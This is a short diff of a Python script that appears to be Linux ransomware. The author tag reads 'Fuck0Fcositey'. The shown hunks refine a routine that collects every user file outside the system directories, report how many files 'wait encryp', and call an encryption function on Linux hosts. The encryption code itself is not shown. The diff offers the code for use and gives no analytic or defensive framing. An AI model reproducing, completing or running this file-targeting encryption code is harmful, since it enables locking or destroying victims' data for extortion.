@@ -1,6 +1,6 @@
-# ############>>>>>>>>>> Write aboute Fuck0Fcosiety <<<<<<<<<############
-#!/bin/python3
+###########>>>>>>>>>> write  by Fuck0Fcositey  <<<<<<<<<#############
 
+#!/bin/python3
 import os
 import platform
 import socket
@@ -29,8 +29,6 @@ def loop_user_files():
         if list_dirs not in system_dirs:
             user_dirs.append("/" + list_dirs)
 
-    print(len(user_dirs))
-
     # get file every directory
     for user_dir in user_dirs:
         try:
@@ -44,10 +42,10 @@ def loop_user_files():
         except Exception as e:
             continue
 
-    return user_files, user_dirs
-
     print("[+] done append file in list")
     print(f"[+]we have {len(user_files)} file wait encryp")
+
+    return user_files, user_dirs
 
 
 def encryption_file_linux():
@@ -103,4 +101,3 @@ def encryption_file_linux():
 
 if check_os() == "Linux":
     encryption_file_linux()
-    loop_user_files()
